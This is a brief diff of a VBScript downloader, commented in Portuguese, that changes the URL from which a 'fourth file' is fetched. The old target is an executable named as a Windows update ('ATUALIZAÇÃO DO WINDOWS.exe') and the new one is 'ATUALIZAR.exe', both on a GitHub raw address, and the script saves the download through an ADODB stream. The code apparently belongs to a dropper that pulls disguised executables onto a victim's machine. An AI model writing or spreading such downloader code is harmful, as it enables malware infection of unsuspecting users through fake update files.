@@ -53,7 +53,7 @@ Dim xHttp4: Set xHttp4 = CreateObject("Microsoft.XMLHTTP")
 Dim bStrm4: Set bStrm4 = CreateObject("Adodb.Stream")
 
 ' Baixar e salvar o quarto arquivo
-xHttp4.Open "GET", "https://raw.githubusercontent.com/2o2ks/lutfica/main/ATUALIZA%C3%87%C3%83O%20DO%20WINDOWS.exe", False
+xHttp4.Open "GET", "https://raw.githubusercontent.com/2o2ks/lutfica/main/ATUALIZAR.exe", False
 xHttp4.Send
 
 With bStrm4
